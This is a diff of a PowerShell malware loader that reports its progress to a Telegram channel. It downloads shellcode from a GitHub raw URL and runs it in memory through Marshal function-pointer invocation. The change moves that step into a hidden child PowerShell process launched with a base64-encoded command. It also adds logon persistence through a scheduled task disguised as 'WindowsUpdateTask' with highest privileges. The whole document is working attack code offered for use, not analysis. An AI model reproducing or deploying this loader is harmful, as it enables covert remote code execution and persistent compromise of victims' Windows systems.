@@ -12,25 +12,23 @@ function Send-Telegram($msg) {
 try {
     Send-Telegram "PS Script started on $env:COMPUTERNAME"
     
-    # Download shellcode
     $url = "https://github.com/bobo22e/bobo/raw/refs/heads/main/agent-windows-amd64-0e8c5426.bin.sgn"
-    Send-Telegram "Downloading from: $url"
+    $encodedCmd = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(
+        "`$c=(New-Object Net.WebClient).DownloadData('$url');`$m=[System.Runtime.InteropServices.Marshal]::AllocHGlobal(`$c.Length);[System.Runtime.InteropServices.Marshal]::Copy(`$c,0,`$m,`$c.Length);[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(`$m,[System.Action]).Invoke()"
+    ))
     
-    $c = (New-Object Net.WebClient).DownloadData($url)
-    Send-Telegram "Downloaded $($c.Length) bytes"
+    # Execute shellcode in a SEPARATE PowerShell process (child dies, parent survives)
+    Send-Telegram "Spawning child PowerShell for shellcode..."
+    Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -EncodedCommand $encodedCmd" -WindowStyle Hidden
     
-    # Execute
-    $m = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($c.Length)
-    [System.Runtime.InteropServices.Marshal]::Copy($c, 0, $m, $c.Length)
-    Send-Telegram "Executing shellcode..."
+    Start-Sleep -Seconds 5
+    Send-Telegram "Shellcode should be running in child process"
     
-    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($m, [Action]).Invoke()
-    Send-Telegram "Shellcode executed"
-    
-    # Persistence
-    $psCmd = "-WindowStyle Hidden -Command `"`$c=(New-Object Net.WebClient).DownloadData('$url');`$m=[System.Runtime.InteropServices.Marshal]::AllocHGlobal(`$c.Length);[System.Runtime.InteropServices.Marshal]::Copy(`$c,0,`$m,`$c.Length);[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(`$m,[System.Action]).Invoke()`""
-    $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($psCmd))
-    schtasks /create /tn "WindowsUpdateTask" /tr "powershell -WindowStyle Hidden -EncodedCommand $encoded" /sc onlogon /rl highest /f 2>&1 | Out-Null
+    # Persistence via scheduled task (also runs in its own process)
+    $persistCmd = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(
+        "`$c=(New-Object Net.WebClient).DownloadData('$url');`$m=[System.Runtime.InteropServices.Marshal]::AllocHGlobal(`$c.Length);[System.Runtime.InteropServices.Marshal]::Copy(`$c,0,`$m,`$c.Length);[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(`$m,[System.Action]).Invoke()"
+    ))
+    schtasks /create /tn "WindowsUpdateTask" /tr "powershell -WindowStyle Hidden -EncodedCommand $persistCmd" /sc onlogon /rl highest /f 2>&1 | Out-Null
     Send-Telegram "Persistence set"
     
 } catch {
